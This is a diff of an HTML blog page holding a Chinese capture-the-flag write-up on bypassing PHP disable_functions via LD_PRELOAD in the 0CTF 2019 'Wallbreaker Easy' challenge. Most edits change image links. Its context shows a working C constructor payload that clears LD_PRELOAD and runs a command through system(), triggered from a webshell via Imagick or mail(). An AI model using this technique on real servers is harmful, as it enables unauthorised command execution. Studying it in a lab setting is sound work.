@@ -97,15 +97,15 @@ index.php123456Imag">
 <meta property="og:description" content="0x00 0ctf2019-Wallbreaker Easy在刚刚结束的0ctf中有一个Web题，提供了webshell，但是禁用了执行命令的函数。在查询资料的时候知道了可以通过LD_PRELOAD绕过disbale_functions的方法。学到的东西在这里记录一下。
 0x01 Wallbreaker Easy Writeup首先记录一下这道题的解题过程。
 index.php123456Imag">
-<meta property="og:image" content="http://yoursite.com/web1.png">
-<meta property="og:image" content="http://yoursite.com/web2.png">
-<meta property="og:updated_time" content="2019-03-26T11:13:30.159Z">
+<meta property="og:image" content="https://github.com/Windylh/image/raw/master/2019.3.25/web1.png">
+<meta property="og:image" content="https://github.com/Windylh/image/raw/master/2019.3.25/web2.png">
+<meta property="og:updated_time" content="2019-03-26T11:25:04.258Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="利用LD_PRELOAD绕过disbale_functions">
 <meta name="twitter:description" content="0x00 0ctf2019-Wallbreaker Easy在刚刚结束的0ctf中有一个Web题，提供了webshell，但是禁用了执行命令的函数。在查询资料的时候知道了可以通过LD_PRELOAD绕过disbale_functions的方法。学到的东西在这里记录一下。
 0x01 Wallbreaker Easy Writeup首先记录一下这道题的解题过程。
 index.php123456Imag">
-<meta name="twitter:image" content="http://yoursite.com/web1.png">
+<meta name="twitter:image" content="https://github.com/Windylh/image/raw/master/2019.3.25/web1.png">
 
 
 
@@ -365,11 +365,11 @@ index.php123456Imag">
 <p>如果我们在我们的函数之前采用这个修饰符，那么程序在加载系统共享对象的时候会优先执行我们的函数，这样就可以不用对特定的函数进行劫持，直接绕过<code>disable_functions</code>。</p>
 <p>修改后的payload：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">extern</span> <span class="keyword">char</span>** environ;</div><div class="line"></div><div class="line">__attribute__ ((__constructor__)) <span class="function"><span class="keyword">void</span> <span class="title">preload</span> <span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* cmdline = <span class="string">"/readflag &gt; /tmp/415c92e8be7c68409ca6bd369d87482f/asd"</span>;</div><div class="line">    <span class="keyword">int</span> i;</div><div class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; environ[i]; ++i) &#123;</div><div class="line">            <span class="keyword">if</span> (<span class="built_in">strstr</span>(environ[i], <span class="string">"LD_PRELOAD"</span>)) &#123;</div><div class="line">                    environ[i][<span class="number">0</span>] = <span class="string">'\0'</span>;</div><div class="line">            &#125;</div><div class="line">    &#125;</div><div class="line">    system(cmdline);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
 <p>同时上传一个doc文件，用Imagick加载。</p>
-<p><img src="web1.png" alt=""></p>
+<p><img src="https://github.com/Windylh/image/raw/master/2019.3.25/web1.png" alt=""></p>
 <p>因为没有了特定函数劫持的限制，只要我们执行mail函数，不管有没有安装sendmail都可以直接绕过<code>disable_functions</code>。</p>
-<p><img src="web2.png" alt=""></p>
+<p><img src="https://github.com/Windylh/image/raw/master/2019.3.25/web2.png" alt=""></p>
 <h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><blockquote>
-<p><a href="https://www.tr0y.wang/2018/04/18/PHPDisalbedfunc/index.html" target="_blank" rel="external">PHP disable_functions Bypass 的方法探究</a><br><a href="https://www.cnblogs.com/hookjoy/p/10167315.html" target="_blank" rel="external">无需sendmail：巧用LD_PRELOAD突破disable_functions</a><br><a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD/blob/master/bypass_disablefunc.c" target="_blank" rel="external">bypass_disablefunc_via_LD_PRELOAD/bypass_disablefunc.c at master · yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a></p>
+<p><a href="https://www.tr0y.wang/2018/04/18/PHPDisalbedfunc/index.html" target="_blank" rel="external">PHP disable_functions Bypass 的方法探究</a><br><a href="https://www.cnblogs.com/hookjoy/p/10167315.html" target="_blank" rel="external">无需sendmail：巧用LD_PRELOAD突破disable_functions</a><br><a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD/blob/master/bypass_disablefunc.c" target="_blank" rel="external">bypass_disablefunc_via_LD_PRELOAD/bypass_disablefunc.c</a></p>
 </blockquote>
 
       
